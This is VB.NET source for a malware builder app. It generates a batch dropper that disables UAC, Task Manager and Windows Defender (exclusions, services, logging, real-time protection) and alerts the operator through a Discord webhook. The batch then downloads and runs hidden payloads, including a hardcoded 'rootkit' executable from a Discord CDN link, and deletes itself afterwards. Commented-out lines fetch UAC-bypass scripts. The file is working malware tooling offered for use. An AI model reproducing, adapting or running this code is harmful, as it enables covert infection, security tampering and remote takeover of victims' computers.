Imports System.IO
Public Class Form1
    '190, 465
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Guna2TextBoxDiscordWebhock.Hide()
        Guna2TextBoxBinderLink.Hide()
        Guna2CheckBoxStartup.Enabled = False
        'Guna2CheckBoxTokenStealer.Enabled = False
    End Sub
    Private Sub Guna2CheckBoxDiscordWebhock_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBoxDiscordWebhock.CheckedChanged
        If Guna2CheckBoxDiscordWebhock.Checked = True Then
            Guna2TextBoxDiscordWebhock.Enabled = True
            Guna2TextBoxDiscordWebhock.Show()
            Guna2TextBoxDiscordWebhock.Clear()
        Else
            Guna2TextBoxDiscordWebhock.Enabled = False
            Guna2TextBoxDiscordWebhock.Hide()
            Guna2TextBoxDiscordWebhock.Clear()
        End If

    End Sub
    Private Sub Guna2CheckBoxBinder_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBoxBinder.CheckedChanged
        If Guna2CheckBoxBinder.Checked = True Then
            Guna2TextBoxBinderLink.Enabled = True
            Guna2TextBoxBinderLink.Show()
            Guna2TextBoxBinderLink.Clear()
        Else
            Guna2TextBoxBinderLink.Hide()
            Guna2TextBoxBinderLink.Enabled = False
            Guna2TextBoxBinderLink.Clear()
        End If
    End Sub
    Private Sub Guna2CheckBoxSelectAll_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBoxSelectAll.CheckedChanged
        If Guna2CheckBoxSelectAll.Checked = True Then
            Guna2CheckBoxDiscordWebhock.Checked = True
            'Guna2CheckBoxTokenStealer.Checked = True
            'Guna2CheckBoxStartup.Checked = True
            Guna2CheckBoxKillTaskManger.Checked = True
            Guna2CheckBoxDisableUAC.Checked = True
            Guna2CheckBoxRemoveWDContextMenu.Checked = True
            Guna2CheckBoxDisableWDSystrayIcon.Checked = True
            Guna2CheckBoxDisableRealtimeProtection.Checked = True
            Guna2CheckBoxDisableWDServices.Checked = True
            Guna2CheckBoxDisableLogging.Checked = True
            Guna2CheckBoxRootkit.Checked = True
            Guna2CheckBoxDeleteAfterRun.Checked = True
            Guna2CheckBoxBinder.Checked = True
        Else
            Guna2CheckBoxDiscordWebhock.Checked = False
            'Guna2CheckBoxTokenStealer.Checked = False
            'Guna2CheckBoxStartup.Checked = False
            Guna2CheckBoxKillTaskManger.Checked = False
            Guna2CheckBoxDisableUAC.Checked = False
            Guna2CheckBoxRemoveWDContextMenu.Checked = False
            Guna2CheckBoxDisableWDSystrayIcon.Checked = False
            Guna2CheckBoxDisableRealtimeProtection.Checked = False
            Guna2CheckBoxDisableWDServices.Checked = False
            Guna2CheckBoxDisableLogging.Checked = False
            Guna2CheckBoxRootkit.Checked = False
            Guna2CheckBoxDeleteAfterRun.Checked = False
            Guna2CheckBoxBinder.Checked = False
        End If
    End Sub

#Region "First Builder"
    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        'Dim tw As TextWriter = New StreamWriter(TextBox3path.Text & "\" & TextBox4Name.Text & ".bat")
        Dim c As New SaveFileDialog
        With c
            .FileName = "UploadThisFile.bat"
        End With
        Dim tw As TextWriter = New StreamWriter(c.FileName)
        'tw.WriteLine("TaskKill /F /IM cmd.exe")
        tw.WriteLine("@echo off")
        'tw.WriteLine("Cd %systemroot%\system32")
        'tw.WriteLine("net sess>nul 2>&1||(start mshta vbscript:code(close(Execute(""CreateObject(""Shell.Application"").ShellExecute""%~0"",,,""RunAs"",1""^)^)^)&exit)")
        'tw.WriteLine("if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min ""%~dpnx0"" %* && exit") 'تصغير شاشا الدوز لأخفاء السي ام دي
        If Guna2CheckBoxDisableUAC.Checked Then
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableInstallerDetection /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableUIADesktopToggle /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableVirtualization /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableUwpStartupTasks /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableSecureUIAPaths /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableFullTrustStartupTasks /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DSCAutomationHostEnabled /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v dontdisplaylastusername /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f")
            tw.WriteLine("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f")
        End If
        If Guna2CheckBoxKillTaskManger.Checked Then
            tw.WriteLine("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
        End If
        '#:_ADD Exclusion
        tw.WriteLine("Powershell -Command ""Set-MpPreference -ExclusionExtension bat""")
        tw.WriteLine("powershell -Command Add-MpPreference -ExclusionExtension ""C:\""")
        tw.WriteLine("powershell -Command Add-MpPreference -ExclusionExtension ""C:\Windows""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files (x86)'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath '%TEMP%'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'TEMP'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\sysconfig'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'C:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'D:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'E:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'F:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'J:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'G:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'I:\'""")
        tw.WriteLine("powershell -inputformat none -outputformat none -NonInteractive -Command ""Add-MpPreference -ExclusionPath 'C:\Windows""")
        tw.WriteLine("powershell -Command Add-MpPreference -ExclusionExtension ""%TEMP%""")
        tw.WriteLine("powershell -Command Add-MpPreference -ExclusionExtension ""TEMP""")
        tw.WriteLine("Delete-Show-Error ""HKLM: \SYSTEM\CurrentControlSet\Services\$svc""")
        '_Disbale
        'Disable Windows Defender with  Group Policy. 
        tw.WriteLine("Reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f > Nul")
        tw.WriteLine("Reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f > Nul")
        tw.WriteLine("Reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""1"" /f > Nul")
        tw.WriteLine("Reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f > Nul")
        tw.WriteLine("Reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f  > Nul")

        If Guna2CheckBoxDisableRealtimeProtection.Checked Then
            'Disable Real - time protection
            tw.WriteLine("reg delete ""HKLM\Software\Policies\Microsoft\Windows Defender"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""0"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""1"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""0"" /f")
            tw.WriteLine("reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f")
        End If
        If Guna2CheckBoxDisableLogging.Checked Then
            'Disable Logging
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger"" /v ""Start"" /t REG_DWORD /d ""0"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger"" / v ""Start"" /t REG_DWORD /d ""0"" / f")
            'Disable WD Tasks
            tw.WriteLine("schtasks /Change /TN ""Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh"" /Disable")
            tw.WriteLine("schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /Disable")
            tw.WriteLine("schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /Disable")
            tw.WriteLine("schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /Disable")
            tw.WriteLine("schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Verification"" /Disable")
        End If

        If Guna2CheckBoxDisableWDSystrayIcon.Checked Then
            'Disable WD systray icon
            tw.WriteLine("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"" /v ""Windows Defender"" /f")
            tw.WriteLine("reg delete ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""Windows Defender"" /f")
            tw.WriteLine("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""WindowsDefender"" /f")
        End If
        If Guna2CheckBoxRemoveWDContextMenu.Checked Then
            'Remove WD context menu
            tw.WriteLine("reg delete ""HKCR\*\shellex\ContextMenuHandlers\EPP"" /f")
            tw.WriteLine("reg delete ""HKCR\Directory\shellex\ContextMenuHandlers\EPP"" /f")
            tw.WriteLine("reg delete ""HKCR\Drive\shellex\ContextMenuHandlers\EPP"" /f")
        End If
        If Guna2CheckBoxDisableWDServices.Checked Then
            'Disable WD services
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\WdBoot"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\WdFilter"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\WdNisDrv"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\WdNisSvc"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\WinDefend"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\SecurityHealthService"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg add ""HKLM\System\CurrentControlSet\Services\Sense"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
            tw.WriteLine("reg delete ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run"" /v ""SecurityHealth"" /f")
        End If
        If Guna2CheckBoxDiscordWebhock.Checked Then
            '#:_SendWebhock
            tw.WriteLine("curl -X POST -H ""Content-type: application/json"" --data ""{\""content\"": \""- Someone has been Fucked Go and Check :joy: \""}"" " & Guna2TextBoxDiscordWebhock.Text)
        End If
        'Payload Link
        If Guna2CheckBoxRootkit.Checked Then
            tw.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('" & Guna2TextBox_Payload_Link.Text & "','%TEMP%\r-77MONSTERMCBUILDERr-77" & Guna2ComboBox1.Text & "');Powershell.exe -ExecutionPolicy Bypass -File '%TEMP%\r-77MONSTERMCBUILDERr-77" & Guna2ComboBox1.Text & "'")
            tw.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1097938945595150366/1139051941381541908/RotkitInstalUninstall.exe','%TEMP%\WinUpdate2.exe');Powershell.exe -ExecutionPolicy Bypass -File '%TEMP%\WinUpdate2.exe'")
            tw.WriteLine("%TEMP%\r-77MONSTERMCBUILDERr-77" & Guna2ComboBox1.Text & "")
            tw.WriteLine("%TEMP%\WinUpdate2.exe")
        Else
            tw.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('" & Guna2TextBox_Payload_Link.Text & "','%TEMP%\MONSTERMCBUILDER" & Guna2ComboBox1.Text & "');Powershell.exe -ExecutionPolicy Bypass -File '%TEMP%\MONSTERMCBUILDER" & Guna2ComboBox1.Text & "'")
            tw.WriteLine("%TEMP%\MONSTERMCBUILDER.exe")
        End If
        'Binder File
        If Guna2CheckBoxBinder.Checked Then
            tw.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('" & Guna2TextBoxBinderLink.Text & "','%TEMP%\BinderFile.exe');Powershell.exe -ExecutionPolicy Bypass -File '%TEMP%\BinderFile.exe'")
            tw.WriteLine("%TEMP%\BinderFile.exe")
        End If
        If Guna2CheckBoxDeleteAfterRun.Checked Then
            tw.WriteLine("echo del BatchByload.bat /f /q >> DeletBaybe.bat")
            tw.WriteLine("echo del StartBypass.bat /f /q >> DeletBaybe.bat")
            tw.WriteLine("echo del test.bat /f /q >> DeletBaybe.bat")
            tw.WriteLine("echo del DeletBaybe.bat /f /q >> DeletBaybe.bat")
            tw.WriteLine("echo del del %0 /f /q >> DeletBaybe.bat")
            tw.WriteLine("del %0")
        End If
        tw.WriteLine("exit")
        'If sssss.Checked Then
        '    tw.WriteLine("start " & sssss.Text & " -Outfile C:\Windows\Temp\Payload.exe")
        '    tw.WriteLine("start C:\Windows\Temp\Payload.exe")
        'End If
        tw.Close()
    End Sub
#End Region
    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs) Handles Guna2Button2.Click
        Dim c2 As New SaveFileDialog
        With c2
            .FileName = "RedyToFuck.bat"
        End With
        Dim tw2 As TextWriter '= New StreamWriter(c2.FileName)
        'tw2.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('" & Guna2TextBoxBatchLink.Text & "','%TEMP%\BatchByload.bat')")
        'If Guna2CheckBoxHideConsole.Checked Then
        '    'مشكله تكرار العمليه هي في سطر تشغيل البات مخفي
        '    tw2.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1096301005005660211/1139432469171535902/UAC_Bypass_Encrption.bat','%TEMP%\StartBypass.bat');Start-Process '%TEMP%\StartBypass.bat'")
        'Else
        '    tw2.WriteLine("PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1096301005005660211/1139435924510478429/UAC_Bypass_Encryptet_Without_Hiding_Console.bat','%TEMP%\StartBypass.bat');Start-Process '%TEMP%\StartBypass.bat'")
        'End If
        'tw2.WriteLine("del %0")
        ''If sssss.Checked Then
        ''    tw.WriteLine("start " & sssss.Text & " -Outfile C:\Windows\Temp\Payload.exe")
        ''    tw.WriteLine("start C:\Windows\Temp\Payload.exe")
        ''End If
        'tw2.WriteLine(Guna2TextBox1.Text = ("ssssssssssssssssssssss"))
        'tw2.WriteLine(Guna2TextBox1.Text = ("dddddddddddddddddddd"))
        Guna2TextBox1.Text = ("ssssssssssssssssssssss")
        Guna2TextBox1.Text = ("dddddddddddddddddddd")
        'tw2.Close()
    End Sub
End Class
